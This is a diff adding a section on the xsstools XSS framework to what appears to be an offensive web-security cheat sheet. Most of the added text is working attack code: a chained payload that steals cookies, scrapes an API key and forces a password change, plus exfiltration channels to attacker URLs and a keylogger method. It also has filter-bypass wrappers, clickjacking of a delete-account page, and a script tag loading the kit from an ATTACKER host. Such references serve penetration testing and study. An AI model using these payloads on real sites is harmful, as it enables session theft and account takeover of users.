@@ -292,11 +292,114 @@ https://target.com/profile?theme=red
 # - Browser to load the CSS (user must visit the page)
 # - Attacker-controlled server to receive the callback requests</code></pre>
 
+  <h2>xsstools — XSS Development Framework</h2>
+  <p>xsstools is a JavaScript XSS development framework (by YesWeHack) that abstracts payload construction, exfiltration, and delivery wrapping into a chainable API. It eliminates the repetitive boilerplate of writing XSS payloads from scratch, handling encoding, DOM manipulation, and data exfiltration in a composable way.</p>
+
+  <h3>Basic Usage — Exfiltrate Cookies and DOM Data</h3>
+  <pre><code">&lt;script type="module"&gt;
+import {Exfiltrators, Payload, Wrapper, utils} from "./xsstools.min.js"
+
+// Choose an exfiltration channel
+const exfiltrator = Exfiltrators.message()   // postMessage — no outbound request needed
+
+// Build a payload chain:
+const payload = Payload.new()
+    .addExfiltrator(exfiltrator)
+    .eval(() =&gt; document.cookie)    // evaluate and stage cookie value
+    .exfiltrate()                   // send via the exfiltrator
+    .fetchDOM("/user/me")           // fetch /user/me page DOM
+    .querySelector("input[name='apikey']", 'value')  // extract API key from DOM
+    .exfiltrate()                   // send that too
+    .postUrlEncoded("/user/changePassword", {"password": "hacked"})  // side effect
+
+// Wrap the payload to bypass filters:
+const wrapper = Wrapper.new()
+    .evalB64()     // base64-encode eval'd code
+    .svgLoad()     // embed in SVG onload attribute
+    .iframe()      // wrap in iframe
+
+const exploit = wrapper.wrap(payload)
+
+const target = "http://vulnerable.domain?param=" + encodeURIComponent(exploit)
+window.open(target)
+&lt;/script&gt;</code></pre>
+
+  <h3>Exfiltrators</h3>
+  <pre><code"># Available exfiltration channels:
+Exfiltrators.message()        // postMessage — no outbound network request
+Exfiltrators.get(url)         // fetch GET to attacker URL
+Exfiltrators.post(url)        // fetch POST urlencoded
+Exfiltrators.postJSON(url)    // fetch POST JSON
+Exfiltrators.sendBeacon(url)  // navigator.sendBeacon (fires on page unload)
+Exfiltrators.console()        // console.log — for local debugging
+Exfiltrators.img(url)         // &lt;img src=...&gt; — simple GET, bypasses CSP fetch-src
+Exfiltrators.style(url)       // &lt;style&gt; @import — CSS channel
+Exfiltrators.iframe(url)      // &lt;iframe src=...&gt; — GET</code></pre>
+
+  <h3>Payload Chaining API</h3>
+  <pre><code"># Common Payload methods:
+Payload.new()
+    .addExfiltrator(exfil)           // attach an exfiltrator
+    .eval(() =&gt; document.cookie)    // run arbitrary JS, stage the result
+    .exfiltrate()                   // flush staged data via exfiltrator
+    .startKeyLogger()               // attach document keydown listener
+    .fetchDOM(path)                 // fetch a URL and load its DOM
+    .fetchJSON(path)                // fetch a URL, parse JSON
+    .querySelector(selector, attr)  // extract attribute from loaded DOM
+    .postUrlEncoded(path, data)     // POST data as application/x-www-form-urlencoded
+    .postJSON(path, data)           // POST data as JSON</code></pre>
+
+  <h3>Wrappers — Payload Encoding and Delivery</h3>
+  <pre><code"># Wrappers encode/embed the payload to bypass input filters:
+const wrapper = Wrapper.new()
+    .minify()          // remove whitespace — bypass length limits
+    .templateString()  // wrap in template literal `${...}`
+    .imgLoad()         // &lt;img src=x onerror=PAYLOAD&gt;
+    .svgLoad()         // &lt;svg onload=PAYLOAD&gt;
+    .innerHTML()       // element.innerHTML = PAYLOAD
+    .script()          // &lt;script&gt;PAYLOAD&lt;/script&gt;
+    .iframe()          // &lt;iframe srcdoc=PAYLOAD&gt;
+    .evalB64()         // eval(atob("BASE64_PAYLOAD"))
+
+# Wrappers stack — each wraps the previous layer:
+const wrapped = Wrapper.new().evalB64().svgLoad().iframe().wrap("alert(1)")
+# Result: &lt;iframe srcdoc="&lt;svg onload=eval(atob('YWxlcnQoMSk='))&gt;"&gt;</code></pre>
+
+  <h3>ClickJacker — Clickjacking Automation</h3>
+  <pre><code"># Automate clickjacking attacks against specific UI elements:
+const cj = new ClickJacker("https://target.com/settings/delete-account")
+
+// Add click steps by bounding box coordinates:
+cj.addStep({x: 42, y: 34, width: 64, height: 35})  // "Delete Account" button
+cj.addStep({x: 200, y: 150, width: 80, height: 30}) // "Confirm" dialog
+
+await cj.run()
+
+// Find element bounding boxes interactively — paste into browser console:
+(()=&gt;{function e(e){e.classList.remove(o),l?e.onclick=l:c.removeEventListener("click",n)}function t({clientX:t,clientY:i}){const d=document.elementFromPoint(t,i);d!=c&amp;&amp;(d.classList.add(o),c&amp;&amp;e(c),d.onclick?(l=d.onclick,d.onclick=n):(l=null,d.addEventListener("click",n,{once:!0})),c=d)}function n(n){n.preventDefault(),n.stopPropagation();let{x:o,y:i,height:c,width:l}=n.target.getBoundingClientRect();[o,i,c,l]=[o,i,c,l].map(e=>+e.toFixed(2)),window.prompt("Bounding box",JSON.stringify({x:o,y:i,height:c,width:l})),e(n.target),window.removeEventListener("mousemove",t)}const o="xxx-selected",i=document.createElement("style");i.innerText=`.${o} {box-shadow: 0 0 0 1px red inset, 0 0 0 1px red;}`;let c=null,l=null;window.addEventListener("mousemove",t),document.body.appendChild(i)})();</code></pre>
+
+  <h3>Installation</h3>
+  <pre><code"># Build from source:
+git clone https://github.com/yeswehack/xsstools
+cd xsstools
+yarn install
+yarn build
+# Output: dist/xsstools.min.js
+
+# Host the built file on your attacker server:
+python3 -m http.server 8080
+
+# Reference in your XSS payload:
+&lt;script type="module" src="http://ATTACKER/xsstools.min.js"&gt;&lt;/script&gt;
+
+# Or inline the minified JS directly in the payload (no external load required)</code></pre>
+
   <h2>Tools</h2>
   <ul>
     <li>Burp Suite DOM Invader — DOM XSS source/sink analysis</li>
     <li>XSS Hunter — <code>xsshunter.trufflesecurity.com</code></li>
     <li>dalfox — <code>github.com/hahwul/dalfox</code> — fast XSS scanner</li>
+    <li>xsstools — XSS development framework — <code>github.com/yeswehack/xsstools</code></li>
     <li>PortSwigger XSS labs — <code>portswigger.net/web-security/cross-site-scripting</code></li>
     <li>XSS cheat sheet — <code>portswigger.net/web-security/cross-site-scripting/cheat-sheet</code></li>
     <li>PortSwigger CSS injection research — <code>portswigger.net/research/blind-css-exfiltration</code></li>
